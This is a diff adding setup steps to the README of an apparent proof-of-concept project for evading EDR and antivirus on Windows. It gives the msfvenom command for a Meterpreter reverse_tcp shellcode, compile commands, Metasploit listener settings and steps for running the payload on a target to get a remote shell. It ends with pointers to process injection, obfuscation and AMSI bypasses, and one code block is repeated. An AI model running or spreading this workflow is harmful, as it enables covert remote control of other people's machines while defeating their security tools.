@@ -37,3 +37,85 @@ This project demonstrates how to bypass EDR and antivirus protection using Windo
 ```bash
 git clone https://github.com/YOUR_USERNAME/EDR-Antivirus-Bypass-Shell.git
 cd EDR-Antivirus-Bypass-Shell
+```
+
+
+### 2. Modify Shellcode
+
+Before compiling, ensure that you modify the shellcode to point to your own IP address and port for the reverse shell. You can generate shellcode using `msfvenom:`
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f csharp
+```
+
+Replace the `byte[] buf` section in Program.cs with the shellcode you just generated.
+
+
+### 3. Compile the Code
+
+Open the project in Visual Studio, or use the following command to compile the code using the .NET SDK:
+
+
+```bash
+csc Program.cs
+```
+
+**Alternatively, you can compile in Release mode for better optimization:
+
+
+```bash
+csc -optimize Program.cs
+```
+
+
+### 4. Start a Listener on Kali
+
+On your Kali Linux machine, start a listener to catch the reverse shell. Use the following commands in Metasploit:
+
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <YOUR_IP>
+set LPORT <YOUR_PORT>
+run
+```
+
+
+### 5. Execute the Payload
+
+Transfer the compiled .exe file to the Windows machine. You can execute the file manually or use any other method to run the file:
+
+
+```bash
+Program.exe
+```
+
+
+6. Obtain the Shell
+
+Once the payload is executed on the target machine, you should see a reverse shell session open in your Metasploit console. From there, you can interact with the system:
+
+
+
+```bash
+meterpreter > sysinfo
+meterpreter > shell
+```
+
+
+7. Additional Bypass Techniques
+
+To avoid detection by advanced EDR solutions, consider using techniques like process injection, obfuscation, or AMSI bypasses. This PoC can be extended with these methods for more robust evasion.
+
+
+```bash
+meterpreter > sysinfo
+meterpreter > shell
+```
+
+
+
+
+
+
